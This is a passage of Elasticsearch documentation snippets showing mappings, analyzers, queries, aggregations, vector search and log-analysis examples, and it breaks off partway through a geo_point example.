TITLE: Defining Runtime Field in Elasticsearch Mapping
DESCRIPTION: Example of adding a runtime field in the mapping definition that extracts the day of the week from a timestamp field. The script uses the @timestamp field to calculate the day name and emits it as a keyword type.

LANGUAGE: console
CODE:
PUT my-index/
{
  "mappings": {
    "runtime": {
      "day_of_week": {
        "type": "keyword",
        "script": {
          "source":
          """emit(doc['@timestamp'].value.dayOfWeekEnum
          .getDisplayName(TextStyle.FULL, Locale.ROOT))"""
        }
      }
    },
    "properties": {
      "@timestamp": {"type": "date"}
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Simple Analyzer in Elasticsearch
DESCRIPTION: Example showing how to use the simple analyzer to process text. The analyzer breaks down the input text into tokens at non-letter characters and converts them to lowercase.

LANGUAGE: console
CODE:
POST _analyze
{
  "analyzer": "simple",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Basic Significant Terms Query
DESCRIPTION: Example of using significant terms aggregation to analyze crime types for British Transport Police.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "terms": { "force": [ "British Transport Police" ] }
  },
  "aggregations": {
    "significant_crime_types": {
      "significant_terms": { "field": "crime_type" }
    }
  }
}

----------------------------------------

TITLE: Simplified Match Query Syntax
DESCRIPTION: Shortened version of the match query combining field and query parameters

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match": {
      "message": "this is a test"
    }
  }
}

----------------------------------------

TITLE: Basic Simple Query String Search in Elasticsearch
DESCRIPTION: Example of a simple query string search using field boosting and boolean operators. The query searches for 'fried eggs' as a phrase, must include either 'eggplant' or 'potato', and excludes 'frittata'.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "simple_query_string" : {
        "query": "\"fried eggs\" +(eggplant | potato) -frittata",
        "fields": ["title^5", "body"],
        "default_operator": "and"
    }
  }
}

----------------------------------------

TITLE: Mapping a Match-Only Text Field
DESCRIPTION: Example of creating an index with a 'match_only_text' field for space-efficient text storage.

LANGUAGE: console
CODE:
PUT logs
{
  "mappings": {
    "properties": {
      "@timestamp": {
        "type": "date"
      },
      "message": {
        "type": "match_only_text"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Nested Query in Elasticsearch
DESCRIPTION: Demonstrates a nested query searching for objects with specific name and count criteria within the nested field.

LANGUAGE: console
CODE:
GET /my-index-000001/_search
{
  "query": {
    "nested": {
      "path": "obj1",
      "query": {
        "bool": {
          "must": [
            { "match": { "obj1.name": "blue" } },
            { "range": { "obj1.count": { "gt": 5 } } }
          ]
        }
      },
      "score_mode": "avg"
    }
  }
}

----------------------------------------

TITLE: Configuring Multi-Analyzer Text Analysis in Elasticsearch
DESCRIPTION: Example demonstrating how to set up multiple analyzers for different query types, specifically handling stop words differently for phrase and non-phrase queries. Shows configuration of custom analyzers, field mappings, and document indexing with search examples.

LANGUAGE: console
CODE:
PUT my-index-000001
{
   "settings":{
      "analysis":{
         "analyzer":{
            "my_analyzer":{
               "type":"custom",
               "tokenizer":"standard",
               "filter":[
                  "lowercase"
               ]
            },
            "my_stop_analyzer":{
               "type":"custom",
               "tokenizer":"standard",
               "filter":[
                  "lowercase",
                  "english_stop"
               ]
            }
         },
         "filter":{
            "english_stop":{
               "type":"stop",
               "stopwords":"_english_"
            }
         }
      }
   },
   "mappings":{
       "properties":{
          "title": {
             "type":"text",
             "analyzer":"my_analyzer",
             "search_analyzer":"my_stop_analyzer",
             "search_quote_analyzer":"my_analyzer"
         }
      }
   }
}

PUT my-index-000001/_doc/1
{
   "title":"The Quick Brown Fox"
}

PUT my-index-000001/_doc/2
{
   "title":"A Quick Brown Fox"
}

GET my-index-000001/_search
{
   "query":{
      "query_string":{
         "query":"\"the quick brown fox\""
      }
   }
}

----------------------------------------

TITLE: Rule Retriever Example in Elasticsearch
DESCRIPTION: Shows how to use a rule retriever to apply query rules on top of search results.

LANGUAGE: console
CODE:
GET movies/_search
{
  "retriever": {
    "rule": {
      "match_criteria": {
        "query_string": "harry potter"
      },
      "ruleset_ids": [
        "my-ruleset"
      ],
      "retriever": {
        "standard": {
          "query": {
            "query_string": {
              "query": "harry potter"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Multi-Index Search in Elasticsearch
DESCRIPTION: Demonstrates how to search across multiple specific indices using comma-separated values in the search API path. The example searches for a user ID across two indices.

LANGUAGE: console
CODE:
GET /my-index-000001,my-index-000002/_search
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

----------------------------------------

TITLE: Creating an Index with Aggregate Metric Double Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with an aggregate_metric_double field. The field is configured with min, max, sum, and value_count metrics, with max set as the default metric.

LANGUAGE: console
CODE:
PUT my-index
{
  "mappings": {
    "properties": {
      "my-agg-metric-field": {
        "type": "aggregate_metric_double",
        "metrics": [ "min", "max", "sum", "value_count" ],
        "default_metric": "max"
      }
    }
  }
}

----------------------------------------

TITLE: Executing Match Phrase Prefix Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the match_phrase_prefix query to search for documents containing phrases beginning with 'quick brown f' in the 'message' field.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match_phrase_prefix": {
      "message": {
        "query": "quick brown f"
      }
    }
  }
}

----------------------------------------

TITLE: Executing Variable Width Histogram Aggregation in Elasticsearch
DESCRIPTION: This snippet demonstrates how to request a variable width histogram aggregation with a target of 2 buckets on the 'price' field in Elasticsearch. The aggregation dynamically determines bucket intervals based on document distribution.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "prices": {
      "variable_width_histogram": {
        "field": "price",
        "buckets": 2
      }
    }
  }
}

----------------------------------------

TITLE: Creating Vector Search Index in Elasticsearch
DESCRIPTION: Creates an index with dense vector mapping for image vectors, including configuration for dimensions, similarity metric, and additional fields.

LANGUAGE: console
CODE:
PUT my-image-index
{
  "mappings": {
    "properties": {
       "image-vector": {
        "type": "dense_vector",
        "dims": 3,
        "index": true,
        "similarity": "l2_norm"
      },
      "file-type": {
        "type": "keyword"
      },
      "title": {
        "type": "text"
      }
    }
  }
}

----------------------------------------

TITLE: Executing a Combined Fields Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the combined_fields query to search across multiple text fields (title, abstract, body) for specific terms with an AND operator.

LANGUAGE: json
CODE:
GET /_search
{
  "query": {
    "combined_fields" : {
      "query":      "database systems",
      "fields":     [ "title", "abstract", "body"],
      "operator":   "and"
    }
  }
}

----------------------------------------

TITLE: Mapping a Completion Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to map a field of type 'completion' in Elasticsearch. The example creates an index named 'music' with a 'suggest' field of type 'completion', which is used for generating fast completions.

LANGUAGE: json
CODE:
PUT music
{
  "mappings": {
    "properties": {
      "suggest": {
        "type": "completion"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Boolean Query Example in Elasticsearch
DESCRIPTION: Demonstrates a boolean query combining multiple clause types including must, filter, must_not and should. Shows usage of minimum_should_match and boost parameters.

LANGUAGE: console
CODE:
POST _search
{
  "query": {
    "bool" : {
      "must" : {
        "term" : { "user.id" : "kimchy" }
      },
      "filter": {
        "term" : { "tags" : "production" }
      },
      "must_not" : {
        "range" : {
          "age" : { "gte" : 10, "lte" : 20 }
        }
      },
      "should" : [
        { "term" : { "tags" : "env1" } },
        { "term" : { "tags" : "deployed" } }
      ],
      "minimum_should_match" : 1,
      "boost" : 1.0
    }
  }
}

----------------------------------------

TITLE: Monitoring User Outbound Connections with ESQL
DESCRIPTION: Query that identifies users with high numbers of outbound connections to non-private IP addresses. Includes CIDR filtering, LDAP enrichment, and conditional evaluation for follow-up flagging.

LANGUAGE: esql
CODE:
FROM logs-*
| WHERE NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS destcount = COUNT(destination.ip) BY user.name, host.name
| ENRICH ldap_lookup_new ON user.name
| WHERE group.name IS NOT NULL
| EVAL follow_up = CASE(destcount >= 100, "true","false")
| SORT destcount DESC
| KEEP destcount, host.name, user.name, group.name, follow_up

----------------------------------------

TITLE: Executing a Disjunction Max Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the dis_max query to search for documents matching either 'Quick pets' in the title or body fields. It includes a tie_breaker parameter to adjust relevance scores for documents matching multiple clauses.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "dis_max": {
      "queries": [
        { "term": { "title": "Quick pets" } },
        { "term": { "body": "Quick pets" } }
      ],
      "tie_breaker": 0.7
    }
  }
}

----------------------------------------

TITLE: Basic Multi-match Query in Elasticsearch
DESCRIPTION: Example of a basic multi_match query searching across multiple fields. The query looks for 'this is a test' in both subject and message fields.

LANGUAGE: json
CODE:
{
  "query": {
    "multi_match" : {
      "query": "this is a test",
      "fields": [ "subject", "message" ]
    }
  }
}

----------------------------------------

TITLE: Rank Feature Query Example
DESCRIPTION: Demonstrates a bool query combining match query with rank feature queries to boost scores based on pagerank, url_length and sports topic.

LANGUAGE: console
CODE:
GET /test/_search
{
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "content": "2016"
          }
        }
      ],
      "should": [
        {
          "rank_feature": {
            "field": "pagerank"
          }
        },
        {
          "rank_feature": {
            "field": "url_length",
            "boost": 0.1
          }
        },
        {
          "rank_feature": {
            "field": "topics.sports",
            "boost": 0.4
          }
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Indexing and Querying Date Fields in Elasticsearch
DESCRIPTION: This example demonstrates how to define a mapping with a date field, index documents with various date formats, and perform a search query with date sorting.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "date": {
        "type": "date"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{ "date": "2015-01-01" }

PUT my-index-000001/_doc/2
{ "date": "2015-01-01T12:10:30Z" }

PUT my-index-000001/_doc/3
{ "date": 1420070400001 }

GET my-index-000001/_search
{
  "sort": { "date": "asc"}
}

----------------------------------------

TITLE: Querying Nested Aggregation for Minimum Price
DESCRIPTION: Performs a nested aggregation to find the minimum price across all resellers for a product.

LANGUAGE: console
CODE:
GET /products/_search?size=0
{
  "query": {
    "match": {
      "name": "led tv"
    }
  },
  "aggs": {
    "resellers": {
      "nested": {
        "path": "resellers"
      },
      "aggs": {
        "min_price": {
          "min": {
            "field": "resellers.price"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Indexing Vector Data in Elasticsearch
DESCRIPTION: Bulk indexes sample vector data with associated metadata using the _bulk API endpoint.

LANGUAGE: console
CODE:
POST my-image-index/_bulk?refresh=true
{ "index": { "_id": "1" } }
{ "image-vector": [1, 5, -20], "file-type": "jpg", "title": "mountain lake" }
{ "index": { "_id": "2" } }
{ "image-vector": [42, 8, -15], "file-type": "png", "title": "frozen lake"}
{ "index": { "_id": "3" } }
{ "image-vector": [15, 11, 23], "file-type": "jpg", "title": "mountain lake lodge" }

----------------------------------------

TITLE: Basic ESQL Query Structure
DESCRIPTION: Demonstrates the basic structure of an ESQL query with a source command and optional processing commands separated by pipe characters.

LANGUAGE: esql
CODE:
source-command
| processing-command1
| processing-command2

LANGUAGE: esql
CODE:
source-command | processing-command1 | processing-command2

----------------------------------------

TITLE: Configuring Arabic Analyzer in Elasticsearch
DESCRIPTION: Example of reimplementing the Arabic analyzer as a custom analyzer in Elasticsearch. It includes stopword removal, stemming, and keyword marking for excluding words from stemming.

LANGUAGE: JSON
CODE:
PUT /arabic_example
{
  "settings": {
    "analysis": {
      "filter": {
        "arabic_stop": {
          "type":       "stop",
          "stopwords":  "_arabic_"
        },
        "arabic_keywords": {
          "type":       "keyword_marker",
          "keywords":   ["مثال"]
        },
        "arabic_stemmer": {
          "type":       "stemmer",
          "language":   "arabic"
        }
      },
      "analyzer": {
        "rebuilt_arabic": {
          "tokenizer":  "standard",
          "filter": [
            "lowercase",
            "decimal_digit",
            "arabic_stop",
            "arabic_normalization",
            "arabic_keywords",
            "arabic_stemmer"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Percolator Field Mapping
DESCRIPTION: Example showing how to configure a percolator field type in an Elasticsearch index mapping.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "query": {
        "type": "percolator"
      },
      "field": {
        "type": "text"
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Range Field Mappings in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure mappings for various range field types in Elasticsearch, including integer_range and date_range. It also shows how to index a document with range values.

LANGUAGE: console
CODE:
PUT range_index
{
  "settings": {
    "number_of_shards": 2
  },
  "mappings": {
    "properties": {
      "expected_attendees": {
        "type": "integer_range"
      },
      "time_frame": {
        "type": "date_range",
        "format": "yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis"
      }
    }
  }
}

PUT range_index/_doc/1?refresh
{
  "expected_attendees" : {
    "gte" : 10,
    "lt" : 20
  },
  "time_frame" : {
    "gte" : "2015-10-31 12:00:00",
    "lte" : "2015-11-01"
  }
}

----------------------------------------

TITLE: Creating and Querying an IP Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index with an IP field, insert a document with an IP address, and perform a query using CIDR notation.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "ip_addr": {
        "type": "ip"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "ip_addr": "192.168.1.1"
}

GET my-index-000001/_search
{
  "query": {
    "term": {
      "ip_addr": "192.168.0.0/16"
    }
  }
}

----------------------------------------

TITLE: Basic Average Aggregation in Elasticsearch
DESCRIPTION: Demonstrates how to compute a basic average over numeric fields in documents. This example calculates the average grade across exam documents.

LANGUAGE: console
CODE:
POST /exams/_search?size=0
{
  "aggs": {
    "avg_grade": { "avg": { "field": "grade" } }
  }
}

LANGUAGE: console-result
CODE:
{
  ...
  "aggregations": {
    "avg_grade": {
      "value": 75.0
    }
  }
}

----------------------------------------

TITLE: Basic Prefix Query in Elasticsearch
DESCRIPTION: Example of a basic prefix query that searches for documents where the user.id field contains terms beginning with 'ki'. Shows the standard query structure with field and value parameters.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "prefix": {
      "user.id": {
        "value": "ki"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Index with Mapped Properties in Elasticsearch
DESCRIPTION: Demonstrates creating an Elasticsearch index with explicitly defined properties for both object and nested field types. The example shows mapping configuration for a manager object and nested employees array, including age and name fields for each.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "manager": {
        "properties": {
          "age":  { "type": "integer" },
          "name": { "type": "text"  }
        }
      },
      "employees": {
        "type": "nested",
        "properties": {
          "age":  { "type": "integer" },
          "name": { "type": "text"  }
        }
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "region": "US",
  "manager": {
    "name": "Alice White",
    "age": 30
  },
  "employees": [
    {
      "name": "John Smith",
      "age": 34
    },
    {
      "name": "Peter Brown",
      "age": 26
    }
  ]
}

----------------------------------------

TITLE: Performing Semantic Search in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the semantic query type to perform a semantic search on a semantic_text field. It searches for "Best surfing places" in the "inference_field".

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "semantic": {
      "field": "inference_field",
      "query": "Best surfing places"
    }
  }
}

----------------------------------------

TITLE: ACL Filter Index Document Structure
DESCRIPTION: Example document structure from the access control index showing user permissions and query template for DLS

LANGUAGE: json
CODE:
{
  "_index": ".search-acl-filter-search-sharepoint",
  "_id": "john@example.co",
  "_version": 1,
  "_seq_no": 0,
  "_primary_term": 1,
  "found": true,
  "_source": {
    "identity": {
      "email": "john@example.co",
      "access_control": [
        "john@example.co",
        "Engineering Members"
      ]
    },
    "query": {
      "template": {
        "params": {
          "access_control": [
            "john@example.co",
            "Engineering Members"
            ]
        },
        "source": """
        {
          "bool": {
            "should": [
              {
                "bool": {
                  "must_not": {
                    "exists": {
                      "field": "_allow_access_control"
                    }
                  }
                }
              },
              {
                "terms": {
                  "_allow_access_control.enum": {{#toJson}}access_control{{/toJson}}
                }
              }
            ]
          }
        }
        """
      }
    }
  }
}

----------------------------------------

TITLE: Basic Match Query in Elasticsearch
DESCRIPTION: Simple example of a match query searching for text in a message field

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match": {
      "message": {
        "query": "this is a test"
      }
    }
  }
}

----------------------------------------

TITLE: Grouping Sales by Type with Top Hits in Elasticsearch
DESCRIPTION: This example demonstrates how to use the top_hits aggregation to group sales by type and show the last sale for each type. It includes source filtering to return only date and price fields.

LANGUAGE: json
CODE:
{
  "aggs": {
    "top_tags": {
      "terms": {
        "field": "type",
        "size": 3
      },
      "aggs": {
        "top_sales_hits": {
          "top_hits": {
            "sort": [
              {
                "date": {
                  "order": "desc"
                }
              }
            ],
            "_source": {
              "includes": [ "date", "price" ]
            },
            "size": 1
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Custom Date Format in Elasticsearch Mapping
DESCRIPTION: This snippet demonstrates how to set up a custom date format for a field in an Elasticsearch index mapping. It uses the 'yyyy-MM-dd' format for the 'date' field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "date": {
        "type":   "date",
        "format": "yyyy-MM-dd"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Terms Query Example in Elasticsearch
DESCRIPTION: Example of a terms query that searches for documents where user.id field matches either 'kimchy' or 'elkbee'. Includes optional boost parameter.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "terms": {
      "user.id": [ "kimchy", "elkbee" ],
      "boost": 1.0
    }
  }
}

----------------------------------------

TITLE: Executing Span Near Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the span_near query in Elasticsearch. It specifies three span_term clauses with a slop of 12 and allows for matches in any order. The query matches spans where the specified terms are within 12 positions of each other.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_near": {
      "clauses": [
        { "span_term": { "field": "value1" } },
        { "span_term": { "field": "value2" } },
        { "span_term": { "field": "value3" } }
      ],
      "slop": 12,
      "in_order": false
    }
  }
}

----------------------------------------

TITLE: Indexing and Querying Epoch Seconds in Elasticsearch
DESCRIPTION: This example demonstrates how to configure a date field to accept epoch seconds, index a document with an epoch second timestamp, and query the field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "date": {
        "type":   "date",
        "format": "strict_date_optional_time||epoch_second"
      }
    }
  }
}

PUT my-index-000001/_doc/example?refresh
{ "date": 1618321898 }

POST my-index-000001/_search
{
  "fields": [ {"field": "date"}],
  "_source": false
}

----------------------------------------

TITLE: Mapping and Querying Multi-Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index with a multi-field mapping, index documents, and perform a search query. It shows how to use the 'text' field type for full-text search and the 'keyword' field type for sorting and aggregations.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "city": {
        "type": "text",
        "fields": {
          "raw": {
            "type":  "keyword"
          }
        }
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "city": "New York"
}

PUT my-index-000001/_doc/2
{
  "city": "York"
}

GET my-index-000001/_search
{
  "query": {
    "match": {
      "city": "york"
    }
  },
  "sort": {
    "city.raw": "asc"
  },
  "aggs": {
    "Cities": {
      "terms": {
        "field": "city.raw"
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Dense Vector Field for kNN Search
DESCRIPTION: This example shows how to configure a dense_vector field for k-nearest neighbor search with a specific similarity metric.

LANGUAGE: console
CODE:
PUT my-index-2
{
  "mappings": {
    "properties": {
      "my_vector": {
        "type": "dense_vector",
        "dims": 3,
        "similarity": "dot_product"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Keyword Field Mapping
DESCRIPTION: Example showing how to map a basic keyword field in Elasticsearch for structured content like tags.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "tags": {
        "type":  "keyword"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Tokenizer Example
DESCRIPTION: Demonstrates how a whitespace tokenizer breaks text into individual tokens based on whitespace characters.

LANGUAGE: plaintext
CODE:
"Quick brown fox!" → [Quick, brown, fox!]

----------------------------------------

TITLE: Querying Documents by ID in Elasticsearch
DESCRIPTION: Demonstrates how to index documents with specific IDs and query them using the terms query on the _id field. Shows both document creation with PUT requests and searching with a terms query against _id field.

LANGUAGE: console
CODE:
# Example documents
PUT my-index-000001/_doc/1
{
  "text": "Document with ID 1"
}

PUT my-index-000001/_doc/2?refresh=true
{
  "text": "Document with ID 2"
}

GET my-index-000001/_search
{
  "query": {
    "terms": {
      "_id": [ "1", "2" ]
    }
  }
}

----------------------------------------

TITLE: Advanced Categorization with Date Histogram
DESCRIPTION: Complex example combining date_histogram with categorize_text aggregation and top_hits sub-aggregation.

LANGUAGE: console
CODE:
POST log-messages/_search?filter_path=aggregations
{
  "aggs": {
    "daily": {
      "date_histogram": {
        "field": "time",
        "fixed_interval": "1d"
      },
      "aggs": {
        "categories": {
          "categorize_text": {
            "field": "message",
            "categorization_filters": ["\\w+\\_\\d{3}"]
          },
          "aggs": {
            "hit": {
              "top_hits": {
                "size": 1,
                "sort": ["time"],
                "_source": "message"
              }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating a GitHub Connector Using Elasticsearch API
DESCRIPTION: Example of using the Elasticsearch API to create a new self-managed GitHub connector. This snippet demonstrates how to set up the connector with basic configuration.

LANGUAGE: console
CODE:
PUT _connector/my-github-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from GitHub",
  "service_type": "github"
}

----------------------------------------

TITLE: Field Boosting in Simple Query String
DESCRIPTION: Shows how to boost specific fields in the search query using the caret notation. The subject field is given 3x more importance than the message field.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "simple_query_string" : {
      "query" : "this is a test",
      "fields" : [ "subject^3", "message" ]
    }
  }
}

----------------------------------------

TITLE: Match Query with AND Operator
DESCRIPTION: Example showing match query with AND operator for stricter matching

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match": {
      "message": {
        "query": "this is a test",
        "operator": "and"
      }
    }
  }
}

----------------------------------------

TITLE: Reciprocal Rank Fusion with Semantic Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use semantic_text as part of Reciprocal Rank Fusion. It combines a standard term query with a semantic query to improve ranking of relevant results.

LANGUAGE: console
CODE:
GET my-index/_search
{
  "retriever": {
    "rrf": {
      "retrievers": [
        {
          "standard": {
            "query": {
              "term": {
                "text": "shoes"
              }
            }
          }
        },
        {
          "standard": {
            "query": {
              "semantic": {
                "field": "semantic_field",
                "query": "shoes"
              }
            }
          }
        }
      ],
      "rank_window_size": 50,
      "rank_constant": 20
    }
  }
}

----------------------------------------

TITLE: Pattern-Based Index Search in Elasticsearch
DESCRIPTION: Shows how to search multiple indices using wildcards and index patterns. The example searches all indices starting with 'my-index-'.

LANGUAGE: console
CODE:
GET /my-index-*/_search
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

----------------------------------------

TITLE: Basic Cardinality Aggregation in Elasticsearch
DESCRIPTION: Demonstrates how to use the cardinality aggregation to count unique products in store sales. The aggregation is applied to the 'type' field.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "type_count": {
      "cardinality": {
        "field": "type"
      }
    }
  }
}

LANGUAGE: console-result
CODE:
{
  ...
  "aggregations": {
    "type_count": {
      "value": 3
    }
  }
}

----------------------------------------

TITLE: Using Lambda Expressions and Method References in Painless
DESCRIPTION: Demonstrates various ways to use lambda expressions and method references in Painless for list operations such as removeIf and sort. It also shows how to reference functions within the script using 'this'.

LANGUAGE: painless
CODE:
list.removeIf(item -> item == 2);
list.removeIf((int item) -> item == 2);
list.removeIf((int item) -> { item == 2 });
list.sort((x, y) -> x - y);
list.sort(Integer::compare);

----------------------------------------

TITLE: Complex Inference Aggregation Example with Web Log Analysis
DESCRIPTION: Comprehensive example showing how to use inference aggregation to analyze web logs, including client IP aggregation, multiple metrics calculations, and malicious client detection using a pre-trained model.

LANGUAGE: console
CODE:
GET kibana_sample_data_logs/_search
{
  "size": 0,
  "aggs": {
    "client_ip": {
      "composite": {
        "sources": [
          {
            "client_ip": {
              "terms": {
                "field": "clientip"
              }
            }
          }
        ]
      },
      "aggs": {
        "url_dc": {
          "cardinality": {
            "field": "url.keyword"
          }
        },
        "bytes_sum": {
          "sum": {
            "field": "bytes"
          }
        },
        "geo_src_dc": {
          "cardinality": {
            "field": "geo.src"
          }
        },
        "geo_dest_dc": {
          "cardinality": {
            "field": "geo.dest"
          }
        },
        "responses_total": {
          "value_count": {
            "field": "timestamp"
          }
        },
        "success": {
          "filter": {
            "term": {
              "response": "200"
            }
          }
        },
        "error404": {
          "filter": {
            "term": {
              "response": "404"
            }
          }
        },
        "error503": {
          "filter": {
            "term": {
              "response": "503"
            }
          }
        },
        "malicious_client_ip": {
          "inference": {
            "model_id": "malicious_clients_model",
            "buckets_path": {
              "response_count": "responses_total",
              "url_dc": "url_dc",
              "bytes_sum": "bytes_sum",
              "geo_src_dc": "geo_src_dc",
              "geo_dest_dc": "geo_dest_dc",
              "success": "success._count",
              "error404": "error404._count",
              "error503": "error503._count"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Histogram Aggregation Query in Elasticsearch
DESCRIPTION: Elasticsearch query demonstrating a basic histogram aggregation on the 'price' field with an interval of 50.

LANGUAGE: json
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "prices": {
      "histogram": {
        "field": "price",
        "interval": 50
      }
    }
  }
}

----------------------------------------

TITLE: Implementing and Querying Nested Fields in Elasticsearch
DESCRIPTION: Comprehensive example showing how to create an index with nested fields, index nested documents, and perform nested queries with inner hits and highlighting.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "user": {
        "type": "nested"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "group" : "fans",
  "user" : [
    {
      "first" : "John",
      "last" :  "Smith"
    },
    {
      "first" : "Alice",
      "last" :  "White"
    }
  ]
}

GET my-index-000001/_search
{
  "query": {
    "nested": {
      "path": "user",
      "query": {
        "bool": {
          "must": [
            { "match": { "user.first": "Alice" }},
            { "match": { "user.last":  "Smith" }}
          ]
        }
      }
    }
  }
}

GET my-index-000001/_search
{
  "query": {
    "nested": {
      "path": "user",
      "query": {
        "bool": {
          "must": [
            { "match": { "user.first": "Alice" }},
            { "match": { "user.last":  "White" }}
          ]
        }
      },
      "inner_hits": {
        "highlight": {
          "fields": {
            "user.first": {}
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Look Back Time
DESCRIPTION: Setting to define the interval for calculating the start_time of a TSDS's first backing index.

LANGUAGE: properties
CODE:
index.look_back_time: "2h"

----------------------------------------

TITLE: Basic Term Suggester Query
DESCRIPTION: Example of using term suggester to get suggestions for multiple fields with different texts

LANGUAGE: console
CODE:
POST _search
{
  "suggest": {
    "my-suggest-1" : {
      "text" : "tring out Elasticsearch",
      "term" : {
        "field" : "message"
      }
    },
    "my-suggest-2" : {
      "text" : "kmichy",
      "term" : {
        "field" : "user.id"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Weighted Tokens Query in Elasticsearch
DESCRIPTION: Example of a basic weighted tokens query request against Elasticsearch. The query includes token-weight pairs and optional pruning configuration for performance optimization.

LANGUAGE: console
CODE:
POST _search
{
  "query": {
    "weighted_tokens": {
      "query_expansion_field": {
        "tokens": {"2161": 0.4679, "2621": 0.307, "2782": 0.1299, "2851": 0.1056, "3088": 0.3041, "3376": 0.1038, "3467": 0.4873, "3684": 0.8958, "4380": 0.334, "4542": 0.4636, "4633": 2.2805, "4785": 1.2628, "4860": 1.0655, "5133": 1.0709, "7139": 1.0016, "7224": 0.2486, "7387": 0.0985, "7394": 0.0542, "8915": 0.369, "9156": 2.8947, "10505": 0.2771, "11464": 0.3996, "13525": 0.0088, "14178": 0.8161, "16893": 0.1376, "17851": 1.5348, "19939": 0.6012},
        "pruning_config": {
          "tokens_freq_ratio_threshold": 5,
          "tokens_weight_threshold": 0.4,
          "only_score_pruned_tokens": false
        }
      }
    }
  }
}

----------------------------------------

TITLE: Named Queries Example in Elasticsearch
DESCRIPTION: Demonstrates how to use named queries to track which queries matched returned documents, with examples of using the _name parameter and include_named_queries_score parameter.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "bool": {
      "should": [
        { "match": { "name.first": { "query": "shay", "_name": "first" } } },
        { "match": { "name.last": { "query": "banon", "_name": "last" } } }
      ],
      "filter": {
        "terms": {
          "name.last": [ "banon", "kimchy" ],
          "_name": "test"
        }
      }
    }
  }
}

LANGUAGE: console
CODE:
GET /_search?include_named_queries_score
{
  "query": {
    "bool": {
      "should": [
        { "match": { "name.first": { "query": "shay", "_name": "first" } } },
        { "match": { "name.last": { "query": "banon", "_name": "last" } } }
      ],
      "filter": {
        "terms": {
          "name.last": [ "banon", "kimchy" ],
          "_name": "test"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating and Querying Geopoint Data in Elasticsearch
DESCRIPTION: This snippet demonstrates creating an index with a geo_point field, indexing documents with geopoints in various formats, and querying the data using a geo_bounding_box query.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "location": {
        "type": "geo_point"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "text": "Geopoint as an object using GeoJSON format",
  "location": { 
    "type": "Point",
    "coordinates": [-71.34, 41.12]
  }
}

PUT my-index-000001/_doc/2
{
  "text": "Geopoint as a WKT POINT primitive",
